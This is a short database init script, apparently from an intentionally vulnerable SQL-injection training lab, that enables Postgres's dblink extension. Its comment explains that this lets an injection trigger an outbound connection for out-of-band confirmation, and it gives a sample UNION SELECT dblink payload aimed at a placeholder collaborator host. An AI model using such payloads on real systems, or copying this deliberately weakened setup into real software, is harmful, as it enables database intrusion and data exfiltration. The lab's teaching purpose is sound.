#!/bin/bash
# Chapter 14 — SQL-injection lab (INTENTIONAL, training only).
#
# Runs once, automatically, only when Postgres initializes a brand-new data
# volume (the official postgres image executes every
# /docker-entrypoint-initdb.d/* script on first boot only), as the superuser
# POSTGRES_USER — the same role the API connects as. It enables the `dblink`
# contrib extension so a single-statement, in-band injection through one of
# this chapter's sinks can trigger an OUTBOUND connection (e.g.
#   ... UNION SELECT ... FROM dblink('host=<collab> user=x dbname=x','SELECT 1') ...
# ) whose host resolution/connect gives out-of-band (OAST) confirmation — no
# stacked query required.
#
# Idempotent (CREATE EXTENSION IF NOT EXISTS) and safe to re-run by hand
# against a live database if this ran before the extension was wanted:
#   docker compose exec postgres bash /docker-entrypoint-initdb.d/02-enable-dblink.sh
set -euo pipefail

psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" --dbname "$POSTGRES_DB" <<-EOSQL
    CREATE EXTENSION IF NOT EXISTS dblink;
EOSQL
